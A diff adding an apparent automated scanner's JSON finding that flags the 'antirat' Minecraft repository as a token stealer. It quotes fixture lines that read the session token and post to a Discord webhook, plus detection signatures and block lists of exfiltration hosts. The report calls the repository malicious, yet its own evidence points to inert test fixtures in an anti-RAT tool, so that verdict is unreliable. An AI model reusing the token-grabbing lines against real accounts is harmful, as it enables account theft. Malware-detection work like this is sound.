@@ -1,0 +1,157 @@
+{
+  "finding": {
+    "key": "repository:moleclient/antirat",
+    "kind": "repository",
+    "id": "moleclient/antirat",
+    "url": "https://github.com/MoleClient/AntiRat",
+    "registry": "github",
+    "owner": "moleclient",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 19,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "credential_access/mc-session-token; network_exfil/discord-webhook; credential_access/mc-launcher-accounts; code_execution/jvm-runtime-exec; network_exfil/paste-exfil",
+    "evidence_locations": "src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java:58; src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java:66; src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java:89; src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java:236; src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java:245; src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java:254; src/main/java/com/antirat/scan/JarScanner.java:299; src/main/java/com/antirat/guard/SensitiveNetworkPolicy.java:222; src/main/java/com/antirat/guard/SensitiveNetworkPolicy.java:230; src/main/java/com/antirat/bootstrap/RelaunchHelper.java:28; src/main/java/com/antirat/bootstrap/DeferredQuarantineHelper.java:24; src/main/java/com/antirat/bootstrap/AutomaticRelaunch.java:53; src/main/java/com/antirat/bootstrap/AgentBootstrap.java:52",
+    "c2_hosts": "discord.com",
+    "iocs": "discord.com; https://discord.com/api/webhooks/123456/inert-runtime-fixture; src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java",
+    "matched_signatures": "\"getSession().getAccessToken()\" \"discord.com/api/webhooks\" language:Java; \"launcher_accounts.json\" \"api/webhooks\"; \"launcher_accounts.json\" \"api.telegram.org\"",
+    "reasons": "Shares a confirmed-malware code signature ['\"getSession().getAccessToken()\" \"discord.com/api/webhooks\" language:Java', '\"launcher_accounts.json\" \"api/webhooks\"', '\"launcher_accounts.json\" \"api.telegram.org\"'] | Tier-2 confirmed (bash score 17)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20261003T093317Z",
+    "last_seen": "hunt-20261003T093317Z",
+    "evidence_file": "repositories/moleclient_antirat.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": "src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java",
+      "line": 58,
+      "category": "credential_access",
+      "rule": "mc-session-token",
+      "snippet": "String token = client.getSession().getAccessToken();"
+    },
+    {
+      "file": "src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java",
+      "line": 66,
+      "category": "network_exfil",
+      "rule": "discord-webhook",
+      "snippet": "new URL(\"https://discord.com/api/webhooks/123456/inert-runtime-fixture\").openConnection();"
+    },
+    {
+      "file": "src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java",
+      "line": 58,
+      "category": "credential_access",
+      "rule": "mc-session-token",
+      "snippet": "String token = client.getSession().getAccessToken();"
+    },
+    {
+      "file": "src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java",
+      "line": 66,
+      "category": "network_exfil",
+      "rule": "discord-webhook",
+      "snippet": "new URL(\"https://discord.com/api/webhooks/123456/inert-runtime-fixture\").openConnection();"
+    },
+    {
+      "file": "src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java",
+      "line": 89,
+      "category": "credential_access",
+      "rule": "mc-launcher-accounts",
+      "snippet": ".resolve(\"antirat-runtime-fixture\").resolve(\".minecraft\").resolve(\"launcher_accounts.json\");"
+    },
+    {
+      "file": "src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java",
+      "line": 236,
+      "category": "code_execution",
+      "rule": "jvm-runtime-exec",
+      "snippet": "new ProcessBuilder(\"sh\", \"-c\", \"exit 97\").start();"
+    },
+    {
+      "file": "src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java",
+      "line": 245,
+      "category": "code_execution",
+      "rule": "jvm-runtime-exec",
+      "snippet": "ProcessBuilder.startPipeline(java.util.List.of(new ProcessBuilder(\"sh\", \"-c\", \"exit 98\")));"
+    },
+    {
+      "file": "src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java",
+      "line": 254,
+      "category": "code_execution",
+      "rule": "jvm-runtime-exec",
+      "snippet": "ProcessBuilder builder = new ProcessBuilder();"
+    },
+    {
+      "file": "src/main/java/com/antirat/scan/JarScanner.java",
+      "line": 299,
+      "category": "network_exfil",
+      "rule": "paste-exfil",
+      "snippet": "if (containsAny(value, \"webhook.site\", \"requestbin.net\", \"beeceptor.com\", \".m.pipedream.net\")) {"
+    },
+    {
+      "file": "src/main/java/com/antirat/guard/SensitiveNetworkPolicy.java",
+      "line": 222,
+      "category": "network_exfil",
+      "rule": "paste-exfil",
+      "snippet": "return host.equals(\"webhook.site\")"
+    },
+    {
+      "file": "src/main/java/com/antirat/guard/SensitiveNetworkPolicy.java",
+      "line": 230,
+      "category": "network_exfil",
+      "rule": "paste-exfil",
+      "snippet": "|| host.equals(\"requestcatcher.com\")"
+    },
+    {
+      "file": "src/main/java/com/antirat/bootstrap/RelaunchHelper.java",
+      "line": 28,
+      "category": "code_execution",
+      "rule": "jvm-runtime-exec",
+      "snippet": "ProcessBuilder replacement = new ProcessBuilder(command);"
+    },
+    {
+      "file": "src/main/java/com/antirat/bootstrap/DeferredQuarantineHelper.java",
+      "line": 24,
+      "category": "code_execution",
+      "rule": "jvm-runtime-exec",
+      "snippet": "new ProcessBuilder(java.toString(), \"-cp\", codeSource.toString(),"
+    },
+    {
+      "file": "src/main/java/com/antirat/bootstrap/AutomaticRelaunch.java",
+      "line": 53,
+      "category": "code_execution",
+      "rule": "jvm-runtime-exec",
+      "snippet": "ProcessBuilder builder = new ProcessBuilder(helperCommand);"
+    },
+    {
+      "file": "src/main/java/com/antirat/bootstrap/AgentBootstrap.java",
+      "line": 52,
+      "category": "code_execution",
+      "rule": "jvm-runtime-exec",
+      "snippet": "ProcessBuilder builder = new ProcessBuilder("
+    }
+  ],
+  "commit_sha": "70af2140a9ca5690ac063111c79e6f80556ad644",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/moleclient/antirat",
+    "version_info": "all",
+    "threat_description": "Git Warden confirmed this repository as malicious by static analysis of its source code. The code was read, never executed. The malicious code sits in the file src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java around line 58. The code reads the Minecraft session access token from the running game client. That token logs in as the victim's Microsoft or Mojang account without a password. Stealer mods, cheat clients and fake plugins grab it and post it to a webhook or bot the attacker controls, which hands over the account. No legitimate project ships code like this. The repository was either compromised or purpose-built to deliver malware to anyone who clones or installs it. The evidence references link the exact file and line of each finding, and the payload description names every detection rule that fired, so a reviewer can open the repository and verify each one independently. Git Warden found this repository by searching GitHub for code that matches a confirmed malware signature: \"getSession().getAccessToken()\" \"discord.com/api/webhooks\" language:Java; \"launcher_accounts.json\" \"api/webhooks\"; \"launcher_accounts.json\" \"api.telegram.org\".",
+    "payload_description": "The malicious payload sits in src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java at line 58. The code reads the Minecraft session access token from the running game client. That token logs in as the victim's Microsoft or Mojang account without a password. Stealer mods, cheat clients and fake plugins grab it and post it to a webhook or bot the attacker controls, which hands over the account. Detection rules that fired in this repository: code_execution/jvm-runtime-exec (5 files), network_exfil/paste-exfil (2 files), credential_access/mc-launcher-accounts (1 file), credential_access/mc-session-token (1 file), network_exfil/discord-webhook (1 file).",
+    "publisher": "moleclient",
+    "severity_level": "high",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "minecraft-account-stealer",
+      "credential-theft"
+    ],
+    "evidence_references": "https://github.com/moleclient/antirat/blob/70af2140a9ca5690ac063111c79e6f80556ad644/src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java#L58\nhttps://github.com/moleclient/antirat/blob/70af2140a9ca5690ac063111c79e6f80556ad644/src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java#L66\nhttps://github.com/moleclient/antirat/blob/70af2140a9ca5690ac063111c79e6f80556ad644/src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java#L89\nhttps://github.com/moleclient/antirat/blob/70af2140a9ca5690ac063111c79e6f80556ad644/src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java#L236\nhttps://github.com/moleclient/antirat/blob/70af2140a9ca5690ac063111c79e6f80556ad644/src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java#L245\nhttps://github.com/moleclient/antirat/blob/70af2140a9ca5690ac063111c79e6f80556ad644/src/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java#L254\nhttps://github.com/moleclient/antirat/blob/70af2140a9ca5690ac063111c79e6f80556ad644/src/main/java/com/antirat/scan/JarScanner.java#L299\nhttps://github.com/moleclient/antirat/blob/70af2140a9ca5690ac063111c79e6f80556ad644/src/main/java/com/antirat/guard/SensitiveNetworkPolicy.java#L222\nhttps://github.com/moleclient/antirat/blob/70af2140a9ca5690ac063111c79e6f80556ad644/src/main/java/com/antirat/guard/SensitiveNetworkPolicy.java#L230\nhttps://github.com/moleclient/antirat/blob/70af2140a9ca5690ac063111c79e6f80556ad644/src/main/java/com/antirat/bootstrap/RelaunchHelper.java#L28\nhttps://github.com/moleclient/antirat/blob/70af2140a9ca5690ac063111c79e6f80556ad644/src/main/java/com/antirat/bootstrap/DeferredQuarantineHelper.java#L24\nhttps://github.com/moleclient/antirat/blob/70af2140a9ca5690ac063111c79e6f80556ad644/src/main/java/com/antirat/bootstrap/AutomaticRelaunch.java#L53\nhttps://github.com/moleclient/antirat/blob/70af2140a9ca5690ac063111c79e6f80556ad644/src/main/java/com/antirat/bootstrap/AgentBootstrap.java#L52",
+    "verified_iocs": "discord.com\nhttps://discord.com/api/webhooks/123456/inert-runtime-fixture\nsrc/runtimeFixture/java/dev/runtimefixture/RuntimeAttackFixture.java",
+    "contributors": [],
+    "first_seen": "2026-10-03T09:33:17Z",
+    "last_seen": "2026-10-03T09:33:17Z"
+  }
+}
